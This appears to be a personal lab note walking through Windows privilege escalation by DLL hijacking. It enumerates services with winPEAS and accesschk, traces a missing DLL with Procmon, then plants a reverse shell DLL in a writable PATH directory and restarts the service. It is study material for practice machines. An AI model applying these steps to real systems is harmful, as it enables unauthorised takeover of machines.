   1. Use winPEAS to enumerate non-Windows services:

```command prompt - windows
.\winPEASx64.exe quiet servicesinfo
```


2. Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:

```command prompt - windows
.\accesschk64.exe /accepteula -uvqc user dllsvc
```

3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:

```command prompt - windows
sc qc dllsvc
```

4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.

5. Add a new filter on the Process Name matching dllhijackservice.exe.

6. On the main screen, deselect registry activity and network activity.

7. Start the service:

```command prompt - windows
net start dllsvc
```

8. Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the hijackme.dll file.

9. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.

10. On Kali, generate a reverse shell DLL named hijackme.dll:

[[1._Reverse Shells (WIN)#DLL]]

11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:

```command prompt - windows
net stop dllsvc
```

```command prompt - windows
net start dllsvc
```

![[Pasted image 20211229132448.png]]

```command prompt - windows
.\accesschk.exe /accepteula -uvqc Aaron WiseBootAssistant
```
